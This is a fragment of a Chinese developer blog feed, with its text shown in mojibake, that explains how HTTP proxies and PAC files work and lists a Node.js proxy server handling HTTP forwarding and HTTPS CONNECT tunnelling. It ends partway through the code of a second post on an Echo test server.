      <title>HTTPä»£ç†æœåŠ¡å™¨</title>
      <link href="/post/http-proxy.html"/>
      <url>/post/http-proxy.html</url>
      
        <content type="html"><![CDATA[<h2 id="HTTPä»£ç†æœåŠ¡å™¨"><a href="#HTTPä»£ç†æœåŠ¡å™¨" class="headerlink" title="HTTPä»£ç†æœåŠ¡å™¨"></a>HTTPä»£ç†æœåŠ¡å™¨</h2><p>ç§‘å­¦ä¸Šç½‘å’Œè°ƒè¯•ç½‘ç«™æ—¶ç»å¸¸ä¼šç”¨åˆ°ä»£ç†æœåŠ¡å™¨ï¼Œé‚£ä¹ˆä»£ç†æœåŠ¡å™¨æ˜¯æ€ä¹ˆå®ç°çš„å‘¢ï¼Ÿä»£ç†æœåŠ¡å™¨å’ŒwebæœåŠ¡å™¨æœ¬èº«æ²¡æœ‰å¤ªå¤šå·®åˆ«ï¼Œå¦‚æœæ˜¯èµ°ä»£ç†è¯·æ±‚æµè§ˆå™¨ä¼šæŠŠè¯·æ±‚å‘é€åˆ°ä»£ç†æœåŠ¡å™¨ï¼Œå¹¶ä¸”è¯·æ±‚æŠ¥æ–‡ä¸­ä½¿ç”¨<strong>å®Œæ•´URI</strong>ï¼ˆå‚è€ƒä¸‹å›¾ä¸­a&#x2F;bï¼‰ã€‚</p><p><img src="/images/http-proxy.png"></p><p>ä½¿ç”¨telnetæ¨¡æ‹Ÿæ™®é€šè¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ telnet css.kekek.cc 80</span><br><span class="line">Trying 47.94.202.145...</span><br><span class="line">Connected to css.kekek.cc.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">GET / HTTP/1.0</span><br><span class="line">host: css.kekek.cc</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: openresty</span><br><span class="line">Date: Fri, 24 Aug 2018 08:48:31 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 3876</span><br><span class="line">Last-Modified: Thu, 03 May 2018 13:28:06 GMT</span><br><span class="line">Connection: close</span><br><span class="line">ETag: &quot;5aeb0e66-f24&quot;</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨telnetæ¨¡æ‹Ÿæ˜¾ç¤ºä»£ç†è¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ telnet proxy.kekek.cc 1337</span><br><span class="line">Trying 39.106.12.213...</span><br><span class="line">Connected to proxy.kekek.cc.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">GET http://css.kekek.cc/ HTTP/1.0</span><br><span class="line">host: css.kekek.cc</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">server: openresty</span><br><span class="line">date: Fri, 24 Aug 2018 08:50:21 GMT</span><br><span class="line">content-type: text/html; charset=UTF-8</span><br><span class="line">content-length: 3876</span><br><span class="line">last-modified: Thu, 03 May 2018 13:28:06 GMT</span><br><span class="line">connection: close</span><br><span class="line">etag: &quot;5aeb0e66-f24&quot;</span><br><span class="line">accept-ranges: bytes</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>HTTPSæ¨¡å¼ä¸‹çš„ä»£ç†å’ŒHTTPæ–¹å¼ä¼šæœ‰æ‰€ä¸åŒï¼Œå› ä¸ºæˆ‘ä»¬æ— æ³•è§£æHTTPSè¯·æ±‚ã€‚é’ˆå¯¹è¿™ç§æƒ…å†µåªèƒ½ä½¿ç”¨é€ä¼ çš„æ–¹å¼ï¼Œåœ¨tcpå±‚ç›´æ¥å°†è¯·æ±‚è½¬å‘åˆ°ç›®æ ‡æœåŠ¡å™¨å³å¯ã€‚</p><h3 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h3><p>ç°ä»£æµè§ˆå™¨å‡ ä¹éƒ½æ”¯æŒ Proxy Auto-Configuration ï¼ˆPACï¼‰ï¼Œè¿™ä¸ªå¯ä»¥è®©æˆ‘ä»¬æ›´çµæ´»çš„ä½¿ç”¨ä»£ç†ã€‚æ¯”å¦‚å…¬å¸ç½‘ç«™ä½¿ç”¨ä»£ç†å…¶å®ƒç½‘ç«™ä¸èµ°ä»£ç†ï¼Œæœ‰äº†PACè¿™éƒ½å¯ä»¥åšåˆ°ã€‚PACæ˜¯ä¸€ä¸ªJavaScriptæ–‡ä»¶ï¼ŒMIMEä¸º<code>application/x-ns-proxy-autoconfig</code>ã€‚æ¯ä¸ªPACæ–‡ä»¶å¿…é¡»æœ‰ä¸€ä¸ªåä¸º<code>FindProxyForURL(url,host)</code>çš„å‡½æ•°ï¼Œç”¨æ¥è®¡ç®—è®¿é—®URIæ—¶ä½¿ç”¨çš„ä»£ç†æœåŠ¡å™¨ã€‚å‡½æ•°è¿”å›å€¼æ ¼å¼å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th>FindProxyForURLçš„è¿”å›å€¼</th><th>æã€€ã€€è¿°</th></tr></thead><tbody><tr><td>DIRECT</td><td>ä¸ç»è¿‡ä»»ä½•ä»£ç†ï¼Œç›´æ¥è¿›è¡Œè¿æ¥</td></tr><tr><td>PROXY host:port</td><td>åº”è¯¥ä½¿ç”¨æŒ‡å®šçš„ä»£ç†</td></tr><tr><td>SOCKS host:port</td><td>åº”è¯¥ä½¿ç”¨æŒ‡å®šçš„ SOCKS æœåŠ¡å™¨</td></tr></tbody></table><p>ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Proxy Auto-Configuration (PAC) file</span></span><br><span class="line"><span class="keyword">var</span> proxy = <span class="string">&quot;PROXY proxy.kekek.cc:1337; DIRECT;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> direct = <span class="string">&#x27;DIRECT;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">FindProxyForURL</span>(<span class="params">url, host</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/\.google\.com$/</span>.<span class="title function_">test</span>(host)) &#123;</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> direct;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨<a href="https://github.com/manugarg/pacparser">pacparser</a>æ¥æµ‹è¯•æˆ‘ä»¬çš„PACæ–‡ä»¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install pacparser</span><br></pre></td></tr></table></figure><h3 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h3><p><a href="https://github.com/tianyk/http-proxy">GitHub</a></p><figure class="highlight javascript"><figcaption><span>proxy.js</span><a href="/downloads/code/autogeneration/proxy.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2018-08-24 17:20:00</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> net = <span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">1337</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">HOST</span> = process.<span class="property">env</span>.<span class="property">HOST</span> || <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MY_IP</span> = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SERVER_TIMEOUT</span> = <span class="number">2</span> * <span class="number">60</span> * <span class="number">1000</span>; <span class="comment">// 2mins</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SEND_TIMEOUT</span>  = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PROXY_TIMEOUT</span> = <span class="number">60</span> * <span class="number">1000</span>; <span class="comment">// 1mins</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ª HTTP ä»£ç†æœåŠ¡å™¨</span></span><br><span class="line"><span class="keyword">const</span> proxy = http.<span class="title function_">createServer</span>();</span><br><span class="line"></span><br><span class="line">proxy.<span class="title function_">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function">(<span class="params">cReq, cRes</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">const</span> cUrl = cReq.<span class="property">url</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(cUrl);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»£ç†æ¨¡å¼</span></span><br><span class="line">    <span class="keyword">if</span> (cUrl.<span class="title function_">startsWith</span>(<span class="string">&#x27;http&#x27;</span>)) {</span><br><span class="line">        <span class="keyword">const</span> { method, headers } = cReq;</span><br><span class="line">        <span class="keyword">const</span> { hostname, port = <span class="number">80</span>, path } = url.<span class="title function_">parse</span>(cReq.<span class="property">url</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// via</span></span><br><span class="line">        <span class="keyword">let</span> via = headers[<span class="string">&#x27;via&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (via) {</span><br><span class="line">            via = via += <span class="string">&#x27;, 1.1 proxy.kekek.cc (KEKE-Proxy)&#x27;</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            via = <span class="string">&#x27;1.1 proxy.kekek.cc (KEKE-Proxy)&#x27;</span>;</span><br><span class="line">        }</span><br><span class="line">        headers[<span class="string">&#x27;via&#x27;</span>] = via;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// x-forward-for</span></span><br><span class="line">        <span class="keyword">let</span> ips = headers[<span class="string">&#x27;x-forward-for&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (ips) {</span><br><span class="line">            ips += <span class="string">`, <span class="subst">${MY_IP}</span>`</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            ips = <span class="variable constant_">MY_IP</span>;</span><br><span class="line">        }</span><br><span class="line">        headers[<span class="string">&#x27;x-forward-for&#x27;</span>] = ips;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Max-Forwards</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æœåŠ¡å™¨å“åº”è¶…æ—¶</span></span><br><span class="line">        <span class="comment">// cRes.setTimeout(SEND_TIMEOUT, () =&gt; {</span></span><br><span class="line">        <span class="comment">//     cRes.writeHead(504, { &#x27;content-type&#x27;: &#x27;text/plain&#x27; });</span></span><br><span class="line">        <span class="comment">//     cRes.end(&#x27;Send Timeout&#x27;);</span></span><br><span class="line">        <span class="comment">// });</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// &lt;http.ClientRequest&gt;</span></span><br><span class="line">        <span class="keyword">const</span> pReq = http.<span class="title function_">request</span>({ hostname, port, path, method, headers });</span><br><span class="line">        pReq</span><br><span class="line">            .<span class="built_in">setTimeout</span>(<span class="variable constant_">PROXY_TIMEOUT</span>)</span><br><span class="line">            .<span class="title function_">on</span>(<span class="string">&#x27;response&#x27;</span>, <span class="function">(<span class="params">pRes</span>) =&gt;</span> {</span><br><span class="line">                <span class="comment">// &lt;http.IncomingMessage&gt;</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[response] [proxy] <span class="subst">${cUrl}</span>`</span>);</span><br><span class="line"></span><br><span class="line">                cRes.<span class="title function_">writeHead</span>(pRes.<span class="property">statusCode</span>, pRes.<span class="property">headers</span>);</span><br><span class="line">                pRes.<span class="title function_">pipe</span>(cRes);</span><br><span class="line">            })</span><br><span class="line">            .<span class="title function_">on</span>(<span class="string">&#x27;timeout&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">                <span class="comment">// ä»£ç†è¯·æ±‚è¶…æ—¶</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[timeout] [proxy-req] <span class="subst">${cUrl}</span>`</span>);</span><br><span class="line">                pReq.<span class="title function_">abort</span>();</span><br><span class="line">            })</span><br><span class="line">            .<span class="title function_">on</span>(<span class="string">&#x27;abort&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[abort] [proxy-req] <span class="subst">${cUrl}</span>`</span>);</span><br><span class="line">            })</span><br><span class="line">            .<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[close] [proxy-req] <span class="subst">${cUrl}</span>`</span>);</span><br><span class="line">            })</span><br><span class="line">            .<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> {</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[error] [proxy-req] <span class="subst">${cUrl}</span> \r\n<span class="subst">${err.stack}</span>`</span>);</span><br><span class="line">                cRes.<span class="title function_">writeHead</span>(<span class="number">500</span>, { <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span> });</span><br><span class="line">                cRes.<span class="title function_">end</span>(<span class="string">`Proxy Error: <span class="subst">${err.code || err.message || err.name}</span>`</span>);</span><br><span class="line">            });</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¯·æ±‚é‡å®šå‘</span></span><br><span class="line">        cReq.<span class="title function_">pipe</span>(pReq);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®¢æˆ·ç«¯ä¸­æ­¢</span></span><br><span class="line">        cReq.<span class="title function_">on</span>(<span class="string">&#x27;aborted&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[aborted] [client] <span class="subst">${cUrl}</span>`</span>);</span><br><span class="line">            <span class="comment">// ä¸­æ­¢ä»£ç†</span></span><br><span class="line">            pReq.<span class="title function_">abort</span>();</span><br><span class="line">        });</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">// http-server</span></span><br><span class="line">        <span class="keyword">if</span> (cUrl === <span class="string">&#x27;/proxy.pac&#x27;</span>) {</span><br><span class="line">            cRes.<span class="title function_">setHeader</span>(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;application/x-ns-proxy-autoconfig&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> pac = <span class="string">`// Proxy Auto-Configuration (PAC) file</span></span><br><span class="line"><span class="string">// https://developer.mozilla.org/en-US/docs/Web/HTTP/Proxy_servers_and_tunneling/Proxy_Auto-Configuration_(PAC)_file</span></span><br><span class="line"><span class="string">// DIRECT        ä¸ç»è¿‡ä»»ä½•ä»£ç†ï¼Œç›´æ¥è¿›è¡Œè¿æ¥</span></span><br><span class="line"><span class="string">// PROXY host:portåº”è¯¥ä½¿ç”¨æŒ‡å®šçš„ä»£ç†</span></span><br><span class="line"><span class="string">// SOCKS host:portåº”è¯¥ä½¿ç”¨æŒ‡å®šçš„ SOCKS æœåŠ¡å™¨</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">var proxy = &quot;PROXY proxy.kekek.cc:1337; DIRECT;&quot;;</span></span><br><span class="line"><span class="string">var direct = &#x27;DIRECT;&#x27;;</span></span><br><span class="line"><span class="string">function FindProxyForURL(url, host){</span></span><br><span class="line"><span class="string">    if (/\.\kekek\.cc$/.test(host)) {</span></span><br><span class="line"><span class="string">        return proxy;</span></span><br><span class="line"><span class="string">    } else {</span></span><br><span class="line"><span class="string">        return direct;</span></span><br><span class="line"><span class="string">    }</span></span><br><span class="line"><span class="string">}`</span>;</span><br><span class="line"></span><br><span class="line">            cRes.<span class="title function_">end</span>(pac);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            cRes.<span class="title function_">setHeader</span>(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>);</span><br><span class="line">            cRes.<span class="title function_">end</span>(<span class="string">&#x27;proxy: proxy.kekek.cc\r\nport: 1337\r\npac: http://proxy.kekek.cc:1337/proxy.pac&#x27;</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// https</span></span><br><span class="line">proxy.<span class="title function_">on</span>(<span class="string">&#x27;connect&#x27;</span>, <span class="function">(<span class="params">req, cltSocket, head</span>) =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">url</span>, head.<span class="property">length</span>)</span><br><span class="line">    <span class="comment">// è¿æ¥åˆ°ä¸€ä¸ªæœåŠ¡å™¨</span></span><br><span class="line">    <span class="keyword">const</span> { port, hostname } = url.<span class="title function_">parse</span>(<span class="string">`http://<span class="subst">${req.url}</span>`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> srvSocket = net.<span class="title function_">connect</span>(port, hostname);</span><br><span class="line"></span><br><span class="line">    srvSocket.<span class="title function_">on</span>(<span class="string">&#x27;connect&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">        cltSocket.<span class="title function_">write</span>(<span class="string">&#x27;HTTP/1.1 200 Connection Established\r\n&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;Proxy-agent: Node.js-Proxy\r\n&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;\r\n&#x27;</span>);</span><br><span class="line">        srvSocket.<span class="title function_">write</span>(head);</span><br><span class="line">        <span class="comment">// è¿æ¥ç®¡é“</span></span><br><span class="line">        srvSocket.<span class="title function_">pipe</span>(cltSocket);</span><br><span class="line">        cltSocket.<span class="title function_">pipe</span>(srvSocket);</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    <span class="comment">// srvSocket.on(&#x27;end&#x27;, () =&gt; {</span></span><br><span class="line">    <span class="comment">//     // è¿œç¨‹æœåŠ¡å™¨æ–­å¼€</span></span><br><span class="line">    <span class="comment">//     console.log(`[end] ${req.url}`);</span></span><br><span class="line">    <span class="comment">//     cltSocket.end();</span></span><br><span class="line">    <span class="comment">// });</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// srvSocket.on(&#x27;timeout&#x27;, () =&gt; {</span></span><br><span class="line">    <span class="comment">//     console.log(`[timeout] ${req.url}`);</span></span><br><span class="line">    <span class="comment">//     srvSocket.end();</span></span><br><span class="line">    <span class="comment">//     cltSocket.end();</span></span><br><span class="line">    <span class="comment">// });</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// srvSocket.on(&#x27;close&#x27;, (hasError) =&gt; {</span></span><br><span class="line">    <span class="comment">//     // è¿œç¨‹æœåŠ¡å™¨å®Œå…¨æ–­å¼€</span></span><br><span class="line">    <span class="comment">//     console.log(`[close] ${req.url} ${hasError}`);</span></span><br><span class="line">    <span class="comment">// });</span></span><br><span class="line"></span><br><span class="line">    srvSocket.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> {</span><br><span class="line">        <span class="comment">// è¿œç¨‹æœåŠ¡å™¨æŠ¥é”™</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[error] <span class="subst">${req.url}</span> \r\n<span class="subst">${err.stack}</span>`</span>);</span><br><span class="line">        <span class="keyword">const</span> error = <span class="string">`Proxy Error: <span class="subst">${err.code || err.message || err.name}</span>`</span></span><br><span class="line">        cltSocket.<span class="title function_">end</span>(<span class="string">`HTTP/1.1 500 Internal Server Error\r\ncontent-type:text/plain\r\ncontent-length:<span class="subst">${err.length}</span>\r\n\r\n<span class="subst">${error}</span>`</span>);</span><br><span class="line">    });</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">proxy.<span class="title function_">on</span>(<span class="string">&#x27;listening&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Proxy-Server running on http://<span class="subst">${HOST}</span>:<span class="subst">${PORT}</span>`</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»£ç†æœåŠ¡å™¨æ­£åœ¨è¿è¡Œ</span></span><br><span class="line">proxy.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="variable constant_">HOST</span>);</span><br></pre></td></tr></table></figure><h3 id="ä»£ç å®ç°-1"><a href="#ä»£ç å®ç°-1" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h3><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://book.douban.com/subject/10746113/">HTTPæƒå¨æŒ‡å—-ç¬¬å…­ç«  ä»£ç†</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Proxy_servers_and_tunneling/Proxy_Auto-Configuration_(PAC)_file">Proxy Auto-Configuration (PAC) file</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> proxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EchoæœåŠ¡</title>
      <link href="/post/echo-server.html"/>
      <url>/post/echo-server.html</url>
      
        <content type="html"><![CDATA[<h2 id="EchoæœåŠ¡"><a href="#EchoæœåŠ¡" class="headerlink" title="EchoæœåŠ¡"></a>EchoæœåŠ¡</h2><p>æœ‰äº›æƒ…å†µä¸‹è°ƒè¯•ç½‘ç»œå®¢æˆ·ç«¯ç¨‹åºæ—¶ä¼šéœ€è¦ä¸€ä¸ªæœåŠ¡å™¨é…åˆæµ‹è¯•ï¼Œè¿™æ—¶EchoæœåŠ¡å°±æ¯”è¾ƒé€‚åˆã€‚å®ƒèƒ½å……å½“ä¸€ä¸ªSocketæœåŠ¡å™¨ï¼Œå¹¶ä¸”ä¼šæŠŠæˆ‘ä»¬ä¼ è¿‡å»çš„å€¼è¿”å›æ¥ã€‚</p><p>æˆ‘ä»¬ä»¥<code>\n</code>æˆ–<code>\r\n</code>ä½œä¸ºç½‘ç»œåŒ…çš„åˆ†éš”ç¬¦ã€‚</p><figure class="highlight javascript"><figcaption><span>echo.js</span><a href="/downloads/code/autogeneration/echo.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 